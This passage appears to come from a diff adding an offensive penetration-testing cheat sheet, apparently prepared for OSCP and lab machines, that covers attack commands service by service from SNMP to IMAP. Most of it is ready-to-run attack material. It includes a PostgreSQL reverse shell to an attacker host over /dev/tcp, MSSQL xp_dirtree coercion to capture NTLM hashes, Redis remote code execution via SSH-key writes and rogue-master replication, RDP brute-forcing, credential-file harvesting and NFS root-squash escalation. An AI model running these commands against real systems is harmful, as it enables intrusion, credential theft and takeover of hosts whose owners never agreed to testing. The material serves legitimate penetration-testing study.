+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -M maq
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --asreproast asrep.out
+cme ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --kerberoasting kerb.out
+</code></pre>
+<hr />
+<h2 id="snmp-udp-161">SNMP (UDP 161)</h2>
+<p>Simple Network Management Protocol. Monitors/configures network devices. <strong>MIB</strong> = vendor-neutral schema; <strong>OID</strong> = numeric path in the MIB tree.</p>
+<table>
+<thead>
+<tr>
+<th>Version</th>
+<th>Security</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SNMPv1</strong></td>
+<td>None (no auth, no encryption)</td>
+<td>Legacy; plaintext everything</td>
+</tr>
+<tr>
+<td><strong>SNMPv2c</strong></td>
+<td>Community string (plaintext)</td>
+<td>Bulk transfers, better errors</td>
+</tr>
+<tr>
+<td><strong>SNMPv3</strong></td>
+<td>Auth (user/pass) + encryption</td>
+<td>USM; use in modern environments</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># snmpwalk with public community
+snmpwalk -v2c -c public &lt;IP&gt;
+
+# snmpwalk with specific OID
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.4.1
+
+# OneSixtyOne community string brute-force
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt &lt;IP&gt;
+
+# Braa (mass OID query)
+braa public@&lt;IP&gt;:.1.3.6.*
+
+# Nmap SNMP scan
+sudo nmap &lt;IP&gt; -sU -p 161 --script snmp*
+
+# Config review (if shell access)
+cat /etc/snmp/snmpd.conf | grep -v &quot;#&quot; | sed -r '/^\s*$/d'
+
+# Net-SNMP &quot;extend&quot;/&quot;exec&quot; scripts — frequently leak command output, paths, or creds on Linux
+snmpwalk -v2c -c public &lt;IP&gt; NET-SNMP-EXTEND-MIB::nsExtendObjects
+</code></pre>
+<p><strong>Dangerous settings:</strong> <code>rwuser noauth</code> (full tree read/write without auth), <code>rwcommunity &lt;string&gt; &lt;source&gt;</code> (full tree access from any source), <code>rwcommunity6</code> (same for IPv6).</p>
+<h3>High-Value Windows OIDs</h3>
+<p>Walk these specifically instead of the whole tree — much faster than a full <code>snmpwalk</code>, and immediately actionable.</p>
+<table>
+<thead>
+<tr>
+<th>OID</th>
+<th>Returns</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1.3.6.1.2.1.1.5.0</code></td>
+<td>Hostname</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.4.1.77.1.2.25</code></td>
+<td>Windows local users</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.4.1.77.1.4.1.0</code></td>
+<td>Domain the host belongs to</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.25.4.2.1.2</code></td>
+<td>Running processes</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.25.4.2.1.4</code></td>
+<td>Full path of each running process</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.25.6.3.1.2</code></td>
+<td>Installed software</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.6.13.1.3</code></td>
+<td>Listening TCP ports</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.7.5.1.2</code></td>
+<td>Listening UDP ports</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.2.1.4.20.1.1</code></td>
+<td>Network interfaces (IPs)</td>
+</tr>
+<tr>
+<td><code>1.3.6.1.4.1.77.1.2.3.1.1</code></td>
+<td>User accounts with last logon</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash"># Users
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.4.1.77.1.2.25
+
+# Installed software
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.25.6.3.1.2
+
+# Listening TCP ports (returns port numbers)
+snmpwalk -v2c -c public &lt;IP&gt; 1.3.6.1.2.1.6.13.1.3
+</code></pre>
+<hr />
+<h2 id="ftp-port-21">FTP (Port 21)</h2>
+<h3>Anonymous FTP</h3>
+<pre><code class="language-bash"># Connect with anonymous login (Name: anonymous / Password: blank or email)
+ftp &lt;IP&gt;
+
+# FTP commands: ls -R, get &lt;file&gt;, put &lt;file&gt;, mput &lt;files&gt;
+
+# Mirror entire FTP server with wget
+wget -m ftp://anonymous:@&lt;IP&gt;
+wget -m --no-passive &quot;ftp://anonymous:anonymous@&lt;TARGET_IP&gt;&quot;
+
+# FTP debug/diagnostic commands
+ftp&gt; debug            # toggle debug mode
+ftp&gt; trace            # toggle packet tracing
+ftp&gt; status           # show client status
+ftp&gt; get &lt;file&gt; -     # download to stdout (read without saving)
+
+# Nmap FTP enumeration
+sudo nmap -sV -p21 -sC -A &lt;IP&gt;
+nmap --script ftp-anon -p 21 &lt;IP&gt;
+
+# Banner grab
+telnet &lt;IP&gt; 21
+
+# FTPS certificate inspection
+openssl s_client -connect &lt;IP&gt;:21 -starttls ftp
+</code></pre>
+<p><strong>vsFTPd dangerous settings:</strong> <code>anonymous_enable=YES</code>, <code>anon_upload_enable=YES</code>, <code>anon_mkdir_write_enable=YES</code>, <code>no_anon_password=YES</code>, <code>write_enable=YES</code>. Blocked accounts list: <code>/etc/ftpusers</code>.</p>
+<h3>FTP Anonymous File Retrieval</h3>
+<p>When anonymous FTP is available, recursively download everything and search for credentials or sensitive files.</p>
+<pre><code class="language-bash"># Recursive download of entire FTP tree
+wget -r --no-passive-ftp ftp://anonymous:anonymous@&lt;TARGET_IP&gt;/
+
+# Or using lftp for better recursive handling
+lftp -u anonymous,anonymous &lt;TARGET_IP&gt;
+lftp&gt; mirror --parallel=5 / ./ftp_dump/
+
+# Search downloaded content for credentials
+grep -ri &quot;password\|passwd\|credential\|secret&quot; ./ftp_dump/ 2&gt;/dev/null
+find ./ftp_dump/ -name &quot;*.conf&quot; -o -name &quot;*.cfg&quot; -o -name &quot;*.ini&quot; -o -name &quot;*.bak&quot; 2&gt;/dev/null
+
+# Umbraco .sdf database credential extraction (if downloaded from FTP/SMB)
+strings Umbraco.sdf | grep -i &quot;admin\|password\|user&quot;
+# Credentials stored as SHA1 hashes — crack with hashcat -m 100
+</code></pre>
+<h3>TFTP (UDP 69)</h3>
+<p>UDP-based file transfer. No authentication, no directory listing — must know/guess filenames. Common targets: PXE stores, router/switch backups, VoIP, ICS/OT. Typical root: <code>/var/lib/tftpboot</code>.</p>
+<pre><code class="language-bash"># Nmap TFTP scan
+sudo nmap -sU -p69 &lt;TARGET&gt;
+
+# Enumerate TFTP files with wordlist
+sudo nmap -sU -p69 --script tftp-enum --script-args &quot;tftp-enum.filelist=/path/to/list.txt&quot; &lt;TARGET&gt;
+</code></pre>
+<p><strong>Interactive client (tftp-hpa):</strong></p>
+<pre><code class="language-bash">tftp &lt;TARGET&gt;
+tftp&gt; verbose
+tftp&gt; status
+tftp&gt; mode binary            # use binary/octet for non-text files
+tftp&gt; get pxelinux.0
+tftp&gt; put upload.bin
+tftp&gt; quit
+</code></pre>
+<p><strong>Non-interactive with atftp:</strong></p>
+<pre><code class="language-bash"># GET (download)
+atftp -g -r pxelinux.0 -l ./pxelinux.0 &lt;TARGET&gt;
+
+# PUT (upload)
+atftp -p -r upload.bin -l ./upload.bin &lt;TARGET&gt;
+
+# Tweak reliability
+atftp --option &quot;timeout 5&quot; --option &quot;blksize 1428&quot; -g -r file &lt;TARGET&gt;
+</code></pre>
+<p><strong>BusyBox one-liner (minimal shells):</strong></p>
+<pre><code class="language-bash">busybox tftp -g -r pxelinux.0 &lt;TARGET&gt;
+</code></pre>
+<p><strong>Windows client</strong> (enable TFTP Client in Windows Features):</p>
+<pre><code class="language-bash">tftp -i &lt;TARGET&gt; GET pxelinux.0 pxelinux.0
+tftp -i &lt;TARGET&gt; PUT C:\temp\upload.bin upload.bin
+</code></pre>
+<p><strong>PXE filename enumeration list:</strong></p>
+<pre><code>pxelinux.0
+pxelinux.cfg/default
+undionly.kpxe
+grub.cfg
+EFI/BOOT/bootx64.efi
+startup-config
+running-config
+router-confg
+network-confg
+</code></pre>
+<p><strong>Server-side check (if you have shell):</strong></p>
+<pre><code class="language-bash">ps aux | grep -E 'tftpd|in.tftpd|atftpd|tftpd-hpa'
+sudo ss -lunp | grep ':69'
+ls -l /var/lib/tftpboot
+</code></pre>
+<p><strong>Pentest notes:</strong> Reads often open for loot (configs, creds in initrds). Writes sometimes allowed for PXE poisoning. Always use binary/octet for non-text.</p>
+<hr />
+<h2 id="ssh-port-22">SSH (Port 22)</h2>
+<pre><code class="language-bash"># SSH audit (security assessment)
+ssh-audit &lt;IP&gt;
+
+# Force password authentication (no key auth)
+ssh -v &lt;user&gt;@&lt;IP&gt; -o PreferredAuthentications=password
+
+# Login
+ssh &lt;user&gt;@&lt;IP&gt;
+ssh -i key_file &lt;user&gt;@&lt;IP&gt;
+
+# Fix &quot;Too many authentication failures&quot; (server MaxAuthTries) — offer ONLY the given key
+ssh -o IdentitiesOnly=yes -i key &lt;user&gt;@&lt;IP&gt;
+ssh -F /dev/null -o IdentitiesOnly=yes -i key &lt;user&gt;@&lt;IP&gt;   # also ignore ~/.ssh/config
+
+# Connect to a LEGACY sshd that rejects modern algorithms (old boxes, e.g. PG ZenPhoto)
+ssh -oHostKeyAlgorithms=+ssh-rsa \
+    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oPubkeyAcceptedAlgorithms=+ssh-rsa &lt;user&gt;@&lt;IP&gt;
+
+# Config review (if shell access)
+cat /etc/ssh/sshd_config | grep -v &quot;#&quot; | sed -r '/^\s*$/d'
+</code></pre>
+<p><strong>Dangerous sshd_config settings:</strong> <code>PermitRootLogin yes</code>, <code>PasswordAuthentication yes</code>, <code>PermitEmptyPasswords yes</code>, <code>Protocol 1</code>, <code>AllowTcpForwarding yes</code>, <code>PermitTunnel</code>, <code>DebianBanner yes</code>, <code>X11Forwarding yes</code>.</p>
+<hr />
+<h2 id="smtp-ports-25-465-587">SMTP (Ports 25, 465, 587)</h2>
+<h3>User Enumeration</h3>
+<pre><code class="language-bash"># smtp-user-enum
+smtp-user-enum -M VRFY -U users.txt -t &lt;IP&gt;
+
+# Nmap SMTP scripts
+nmap --script smtp-open-relay -p 25 &lt;IP&gt;
+
+# Manual enumeration via telnet
+telnet &lt;IP&gt; 25
+VRFY &lt;username&gt;
+EXPN &lt;group&gt;
+QUIT
+</code></pre>
+<p><strong>VRFY response codes</strong> (know what the server means):</p>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>250</code></td>
+<td>User confirmed valid</td>
+</tr>
+<tr>
+<td><code>252</code></td>
+<td>Server WILL accept mail but won't confirm the recipient exists (common — still reveals valid syntax)</td>
+</tr>
+<tr>
+<td><code>550</code></td>
+<td>User does not exist (or VRFY disabled)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Manual VRFY scan from Kali via Python</strong> — when smtp-user-enum isn't installed on a jump box:</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# vrfy.py — usage: python3 vrfy.py &lt;IP&gt; users.txt
+import socket, sys
+ip, wl = sys.argv[1], sys.argv[2]
+for u in open(wl):
+    u = u.strip()
+    s = socket.socket(); s.connect((ip, 25)); s.recv(1024)
+    s.send(f&quot;VRFY {u}\r\n&quot;.encode())
+    r = s.recv(1024).decode().strip()
+    if r.startswith((&quot;250&quot;,&quot;252&quot;)):
+        print(f&quot;[+] {u}  {r}&quot;)
+    s.close()
+</code></pre>
+<p><strong>Manual VRFY from a Windows foothold via Telnet-Client:</strong></p>
+<pre><code class="language-powershell"># Telnet client isn't installed by default on Win10+; enable it (needs admin)
+dism /online /Enable-Feature /FeatureName:TelnetClient
+
+telnet &lt;IP&gt; 25
+# EHLO test
+# VRFY root
+# VRFY nobody
+# QUIT
+</code></pre>
+<h3>Banner Grab</h3>
+<pre><code class="language-bash"># Manual connection
+printf &quot;QUIT\r\n&quot; | nc -nv &lt;IP&gt; 25
+
+# Check SMTP(S) TLS certificate
+openssl s_client -connect &lt;IP&gt;:25 -starttls smtp
+
+# Nmap SMTP scan
+sudo nmap &lt;IP&gt; -sC -sV -p25
+
+# MSF SMTP enumeration
+use auxiliary/scanner/smtp/smtp_version
+use auxiliary/scanner/smtp/smtp_enum
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+</code></pre>
+<h3>SMTP Command Reference</h3>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>HELO</code> / <code>EHLO</code></td>
+<td>Identify client to server (EHLO = extended)</td>
+</tr>
+<tr>
+<td><code>AUTH PLAIN</code></td>
+<td>Authenticate</td>
+</tr>
+<tr>
+<td><code>MAIL FROM:</code></td>
+<td>Set sender address</td>
+</tr>
+<tr>
+<td><code>RCPT TO:</code></td>
+<td>Set recipient address</td>
+</tr>
+<tr>
+<td><code>DATA</code></td>
+<td>Begin message body (end with <code>.</code> on its own line)</td>
+</tr>
+<tr>
+<td><code>VRFY</code></td>
+<td>Verify user exists</td>
+</tr>
+<tr>
+<td><code>EXPN</code></td>
+<td>Expand mailing list</td>
+</tr>
+<tr>
+<td><code>RSET</code></td>
+<td>Reset current session</td>
+</tr>
+<tr>
+<td><code>NOOP</code></td>
+<td>No operation (keep-alive)</td>
+</tr>
+<tr>
+<td><code>QUIT</code></td>
+<td>Close connection</td>
+</tr>
+</tbody>
+</table>
+<h3>Manual Email via Telnet</h3>
+<pre><code class="language-bash">telnet &lt;IP&gt; 25
+HELO &lt;ATTACKER_DOMAIN&gt;
+MAIL FROM: &lt;SENDER&gt;@&lt;ATTACKER_DOMAIN&gt;
+RCPT TO: &lt;RECIPIENT&gt;@&lt;TARGET_DOMAIN&gt;
+DATA
+Subject: &lt;SUBJECT&gt;
+&lt;MESSAGE_BODY&gt;
+.
+QUIT
+</code></pre>
+<h3>Send Email via CLI</h3>
+<pre><code class="language-bash">sendemail -f &lt;SENDER&gt;@&lt;DOMAIN&gt; -t &lt;RECIPIENT&gt;@&lt;TARGET_DOMAIN&gt; \
+  -s &lt;TARGET_IP&gt; -u &quot;&lt;SUBJECT&gt;&quot; -m &quot;&lt;BODY&gt;&quot; -o tls=no
+</code></pre>
+<p><strong>Dangerous settings (Postfix):</strong> open relay via <code>mynetworks = 0.0.0.0/0</code>. Default config: <code>/etc/postfix/main.cf</code>.</p>
+<hr />
+<h2 id="nfs-ports-111-2049">NFS (Ports 111, 2049)</h2>
+<p>Network File System. No built-in auth — relies on UID/GID mapping. NFSv4+ supports Kerberos.</p>
+<p><strong>Dangerous settings:</strong> <code>no_root_squash</code> (client root = server root), <code>insecure</code> (ports &gt;1024), <code>nohide</code> (exposes nested mounts), <code>rw</code> (write access).</p>
+<pre><code class="language-bash"># Nmap NFS scan
+sudo nmap --script nfs* &lt;IP&gt; -sV -p111,2049
+
+# List NFS exports
+showmount -e &lt;IP&gt;
+
+# Mount NFS share
+sudo mount -t nfs &lt;IP&gt;:/&lt;share&gt; /mnt/nfs -o nolock
+sudo mount -t nfs -o ro,nolock,vers=3,proto=tcp &lt;IP&gt;:/mnt/nfsshare ./NFSV2
+
+# List with numeric UIDs/GIDs (forensic mapping)
+ls -n /mnt/nfs/
+
+# Unmount
+sudo umount /mnt/nfs
+</code></pre>
+<p><strong>Priv-esc via no_root_squash + SSH:</strong> If <code>no_root_squash</code> is set, mount the share as root, drop a SUID binary owned by target user, then execute it via SSH as that user to escalate privileges.</p>
+<p><strong>Server-side config review (if you have shell):</strong></p>
+<pre><code class="language-bash">cat /etc/exports
+exportfs                    # verify active exports
+</code></pre>
+<p><strong>Export options reference:</strong> <code>rw</code> (read-write), <code>ro</code> (read-only), <code>sync</code>/<code>async</code> (I/O mode), <code>secure</code>/<code>insecure</code> (port restriction), <code>root_squash</code>/<code>no_root_squash</code> (root mapping), <code>no_subtree_check</code> (skip subtree checks).</p>
+<h3>NFS User Discovery from Folder Names</h3>
+<p>After mounting an NFS share, folder names under home-directory exports often reveal valid usernames. UID/GID mismatches may block reads — create a local user matching the target UID to bypass this.</p>
+<pre><code class="language-bash"># Enumerate exports and mount
+showmount -e &lt;TARGET_IP&gt;
+sudo mount -t nfs &lt;TARGET_IP&gt;:/&lt;SHARE&gt; /mnt/nfs
+
+# List top-level directories — folder names = potential usernames
+ls -la /mnt/nfs/
+
+# If permission denied due to UID mismatch, create matching local user
+sudo useradd -u &lt;UID&gt; -s /bin/bash tempuser
+sudo -u tempuser ls -la /mnt/nfs/&lt;USER&gt;/
+
+# Unmount when done
+sudo umount /mnt/nfs
+</code></pre>
+<p><strong>Key insight:</strong> NFS exports often lack Kerberos or proper UID mapping, meaning file ownership is purely numeric UID. Create a local user with the same UID as the file owner to read restricted files.</p>
+<hr />
+<h2 id="mssql-port-1433">MSSQL (Port 1433)</h2>
+<p>Microsoft SQL Server. Service account commonly <code>NT SERVICE\MSSQLSERVER</code>. Default system databases: <strong>master</strong>, <strong>model</strong>, <strong>msdb</strong>, <strong>tempdb</strong>, <strong>resource</strong>.</p>
+<p><strong>Dangerous settings:</strong> clients not using encryption, self-signed certs (spoofable), named pipes enabled, weak/default <code>sa</code> credentials.</p>
+<pre><code class="language-bash"># Connect with Windows auth
+impacket-mssqlclient &lt;user&gt;@&lt;IP&gt; -windows-auth
+
+# Nmap MSSQL enumeration
+sudo nmap -p1433 -sV --script ms-sql-info,ms-sql-config,ms-sql-empty-password &lt;IP&gt;
+nmap -Pn --script ms-sql* -sV -p 1433 &lt;IP&gt;
+
+# Extended nmap with script-args
+sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 &lt;IP&gt;
+
+# Inside mssqlclient:
+SQL&gt; SELECT @@version
+SQL&gt; enable_xp_cmdshell
+SQL&gt; xp_cmdshell whoami
+SQL&gt; EXEC sp_linkedservers;
+SQL&gt; SELECT * FROM OPENQUERY(&lt;DB&gt;, 'SELECT name FROM sys.databases');
+
+# CrackMapExec MSSQL
+cme mssql &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -q &quot;&lt;SQL_QUERY&gt;&quot;
+cme mssql &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &quot;whoami&quot;
+
+# sqsh — interactive MSSQL client (Linux)
+sqsh -S &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt; -h
+sqsh -S &lt;TARGET_IP&gt; -U .\\&lt;USER&gt; -P &lt;PASSWORD&gt; -h   # Windows auth
+
+# sqlcmd — Microsoft MSSQL client (Windows)
+sqlcmd -S &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt;
+sqlcmd -S &lt;TARGET_IP&gt; -U &lt;USER&gt; -P &lt;PASSWORD&gt; -Q &quot;SELECT @@version&quot;
+</code></pre>
+<h3>MSSQL RID Brute-Force via netexec</h3>
+<p>Enumerate domain users through MSSQL when SMB/LDAP is restricted but MSSQL is accessible.</p>
+<pre><code class="language-bash"># RID brute-force over MSSQL (local auth)
+netexec mssql &lt;TARGET_IP&gt; -u '&lt;USER&gt;' -p '&lt;PASSWORD&gt;' --rid-brute --local-auth
+
+# RID brute-force over MSSQL (domain auth)
+netexec mssql &lt;TARGET_IP&gt; -u '&lt;USER&gt;' -p '&lt;PASSWORD&gt;' --rid-brute -d &lt;DOMAIN&gt;
+</code></pre>
+<h3>MSSQL xp_dirtree for NTLM Hash Capture</h3>
+<p>Force the MSSQL service account to authenticate to Responder, capturing its NTLMv2 hash.</p>
+<pre><code class="language-bash"># Step 1: Start Responder on attacker machine
+sudo responder -I &lt;INTERFACE&gt; -v
+
+# Step 2: Trigger UNC authentication from MSSQL
+SQL&gt; EXEC xp_dirtree '\\&lt;ATTACKER_IP&gt;\share', 1, 1
+# Or:
+SQL&gt; EXEC xp_fileexist '\\&lt;ATTACKER_IP&gt;\share\file'
+
+# Responder captures NTLMv2 hash — crack with hashcat -m 5600
+hashcat -m 5600 mssql.hash /usr/share/wordlists/rockyou.txt
+</code></pre>
+<hr />
+<h2 id="mysql-port-3306">MySQL (Port 3306)</h2>
+<pre><code class="language-bash"># Connect
+mysql -u &lt;user&gt; -p&lt;pass&gt; -h &lt;IP&gt;
+
+# &quot;SSL is required but the server does not support it&quot; — force plaintext (older MariaDB)
+mysql -h &lt;IP&gt; -u &lt;user&gt; -p'&lt;pass&gt;' --skip-ssl &lt;db&gt;            # MariaDB client
+mysql -h &lt;IP&gt; -u &lt;user&gt; -p'&lt;pass&gt;' --ssl-mode=DISABLED &lt;db&gt;   # Oracle MySQL client
+
+# Nmap MySQL enumeration
+sudo nmap &lt;IP&gt; -sV -sC -p3306 --script mysql*
+nmap &lt;TARGET_IP&gt; -sV -sC -p3306 --script mysql-info,mysql-enum
+
+# SQL commands: SHOW DATABASES; USE &lt;db&gt;; SHOW TABLES; SHOW COLUMNS FROM &lt;table&gt;; SELECT * FROM &lt;table&gt;;
+
+# Config review (if shell access)
+cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v &quot;#&quot; | sed -r '/^\s*$/d'
+</code></pre>
+<p><strong>Security-relevant settings:</strong> <code>user</code> (OS user MySQL runs as), <code>password</code> (may be plaintext in config), <code>admin_address</code>, <code>secure_file_priv</code> (restricts file import/export paths), <code>sql_warnings</code>, <code>debug</code>.</p>
+<h3>Find MySQL Credentials on Linux</h3>
+<p>MySQL credentials often stored in web application config files.</p>
+<pre><code class="language-bash"># Common config locations
+cat /var/www/html/config.php
+cat /var/www/html/wp-config.php
+cat /etc/zabbix/zabbix_server.conf | grep -i &quot;dbpassword\|dbuser&quot;
+
+# Grep for password strings in web configs
+grep -r &quot;password&quot; /var/www/ --include=&quot;*.php&quot; --include=&quot;*.conf&quot; 2&gt;/dev/null
+
+# Find all .conf files with passwords
+find /etc -name &quot;*.conf&quot; -exec grep -l &quot;password&quot; {} \; 2&gt;/dev/null
+find /var/www -name &quot;config*&quot; -exec grep -l &quot;password&quot; {} \; 2&gt;/dev/null
+</code></pre>
+<h3>Zabbix-Specific MySQL</h3>
+<pre><code class="language-bash">SELECT userid, alias, passwd FROM zabbix.users;
+SELECT name, host FROM zabbix.hosts;
+SELECT * FROM zabbix.media;
+</code></pre>
+<hr />
+<h2 id="postgresql-port-5432">PostgreSQL (Port 5432)</h2>
+<p>OSCP staple (PG Nibbles — often relocated to a non-standard port like <strong>5437</strong>, so scan for it). Superuser access gives direct OS command execution.</p>
+<pre><code class="language-bash"># Connect (try default creds postgres:postgres)
+psql -h &lt;IP&gt; -U postgres            # prompts for password
+PGPASSWORD='&lt;pass&gt;' psql -h &lt;IP&gt; -U postgres -p &lt;PORT&gt;
+
+# Enumerate inside psql
+\l            # list databases
+\c &lt;db&gt;       # connect to db
+\dt           # list tables
+\du           # list roles (look for Superuser)
+
+# RCE as the postgres OS user (superuser only) — canonical foothold
+COPY (SELECT '') TO PROGRAM 'id';
+COPY (SELECT '') TO PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1&quot;';
+
+# Read a local file into a table (arbitrary file read as postgres)
+CREATE TABLE x(d text); COPY x FROM '/etc/passwd'; SELECT * FROM x;
+</code></pre>
+<hr />
+<h2 id="redis-port-6379">Redis (Port 6379)</h2>
+<p>Common unauthenticated OSCP/PG service (Wombo, Sybaris). If <code>INFO</code> answers without <code>AUTH</code>, it's open. Redis frequently runs as <strong>root</strong> -&gt; instant win.</p>
+<pre><code class="language-bash">redis-cli -h &lt;IP&gt; INFO
+redis-cli -h &lt;IP&gt; -a &lt;PASS&gt;          # try foobared / redis / password / admin if AUTH required
+redis-cli -h &lt;IP&gt; CONFIG GET dir     # confirm write location + running user
+
+# --- RCE paths ---
+# &lt; 4.0  SSH-key write (Redis dir must be a real user's ~/.ssh, running as that user):
+#   CONFIG SET dir /root/.ssh/  ; CONFIG SET dbfilename authorized_keys
+#   SET x &quot;\n\n&lt;your-ssh-pubkey&gt;\n\n&quot; ; SAVE  ; then ssh in
+# 4.0+   Malicious module (RedisModules-ExecuteCommand): compile exp.so, upload (e.g. anon FTP),
+redis-cli -h &lt;IP&gt; MODULE LOAD /path/to/exp.so
+redis-cli -h &lt;IP&gt; system.exec &quot;id&quot;
+# 4.0+   SLAVEOF rogue-master replication RCE:
+python3 redis-rogue-server.py --rhost &lt;IP&gt; --lhost &lt;LHOST&gt; --lport 80
+</code></pre>
+<p>Rogue-master / module-callback ports must be <strong>egress-allowed</strong> (80/443 on locked-down boxes). Drive Redis with <code>redis-cli &lt;cmd&gt;</code> one-shot — the interactive prompt can be buggy over these exploits.</p>
+<hr />
+<h2 id="rdp-port-3389">RDP (Port 3389)</h2>
+<p>Remote Desktop Protocol.</p>
+<pre><code class="language-bash"># xfreerdp (free RDP client)
+xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;IP&gt; /dynamic-resolution
+
+# xfreerdp with drive redirection
+xfreerdp /u:&lt;user&gt; /p:&lt;pass&gt; /v:&lt;IP&gt; /drive:share,/tmp
+
+# CrackMapExec RDP
+cme rdp &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --screenshot
+cme rdp &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --nla-screenshot
+
+# Nmap RDP scan
+nmap -sV -sC &lt;TARGET_IP&gt; -p3389 --script rdp*
+
+# crowbar — RDP brute-force (supports key-based and password auth)
+crowbar -b rdp -s &lt;TARGET_IP&gt;/32 -u &lt;USER&gt; -C /path/to/wordlist.txt -n 1
+crowbar -b rdp -s &lt;TARGET_IP&gt;/32 -U users.txt -C passwords.txt -n 1
+
+# rdesktop (alternative RDP client)
+rdesktop -u &lt;USER&gt; -p &lt;PASSWORD&gt; &lt;TARGET_IP&gt;
+</code></pre>
+<hr />
+<h2 id="winrm-ports-5985-5986">WinRM (Ports 5985, 5986)</h2>
+<p>Windows Remote Management. Allows remote PowerShell execution.</p>
+<pre><code class="language-bash"># evil-winrm
+evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt;
+evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -H &lt;NTLM_hash&gt;
+
+# PowerShell Enter-PSSession
+Enter-PSSession -ComputerName &lt;HOST&gt; -Credential $cred
+
+# Invoke-Command
+Invoke-Command -ComputerName &lt;HOST&gt; -ScriptBlock { whoami }
+
+# winrs command
+winrs -r:&lt;IP&gt; &quot;powershell -c whoami;hostname&quot;
+
+# CrackMapExec WinRM
+cme winrm &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &quot;whoami&quot;
+cme winrm &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -X &quot;Get-Process&quot;
+
+# Nmap WinRM scan
+nmap -sV -sC &lt;TARGET_IP&gt; -p5985,5986 --disable-arp-ping -n
+</code></pre>
+<hr />
+<h2 id="wmi-port-135">WMI (Port 135)</h2>
+<p>Windows Management Instrumentation. RPC-based remote code execution.</p>
+<pre><code class="language-bash"># wmiexec.py
+wmiexec.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;IP&gt; &quot;whoami&quot;
+wmiexec.py &lt;USER&gt;:'&lt;PASSWORD&gt;'@&lt;TARGET_IP&gt; &quot;hostname&quot;
+
+# CrackMapExec WMI
+cme wmi &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; -x &quot;whoami&quot;
+
+# Impacket dcomexec (alternative)
+dcomexec.py &lt;DOMAIN&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;IP&gt; &quot;whoami&quot;
+</code></pre>
+<hr />
+<h2 id="imap-pop3-ports-110-143-993-995">IMAP &amp; POP3 (Ports 110, 143, 993, 995)</h2>
+<p>Email access protocols. IMAP manages mail on server; POP3 retrieves (download/delete).</p>
+<p><strong>Dangerous Dovecot settings:</strong> <code>auth_debug</code> / <code>auth_verbose</code> (leaks auth details to logs), <code>auth_debug_passwords</code> / <code>auth_verbose_passwords</code> (logs passwords), <code>auth_anonymous_username</code> (enables anonymous SASL logins).</p>
+<pre><code class="language-bash"># Nmap email scan
+sudo nmap -sV -sC -p143,993,110,995 &lt;IP&gt; -Pn
+
+# POP3 banner
+printf &quot;QUIT\r\n&quot; | nc -nv &lt;IP&gt; 110
+
+# IMAPS banner and certificate
+openssl s_client -connect &lt;IP&gt;:imaps
+
+# STARTTLS on cleartext ports
+openssl s_client -connect &lt;IP&gt;:143 -starttls imap
+openssl s_client -connect &lt;IP&gt;:110 -starttls pop3
+
+# IMAP TLS connection + raw commands
+openssl s_client -connect &lt;IP&gt;:993 -crlf -quiet
+a1 LOGIN &lt;USER&gt; &lt;PASS&gt;
+a2 SELECT &quot;&lt;MAILBOX&gt;&quot;
+a3 FETCH 1 BODY[]
+
+# curl IMAP test
+curl -k 'imaps://&lt;IP&gt;' --user &lt;USER&gt;:&lt;PASS&gt; -v
+
+# Manual POP3 read once you hold ONE password — the inbox is often the walkthrough (PG Hepet)
+nc &lt;IP&gt; 110
+  USER &lt;USER&gt;
+  PASS &lt;PASS&gt;
+  LIST            # message index
+  RETR 1          # read message 1, then RETR 2, 3, ...
+  QUIT
+</code></pre>
+<h3>IMAP Password Spraying (Credential Reuse)</h3>
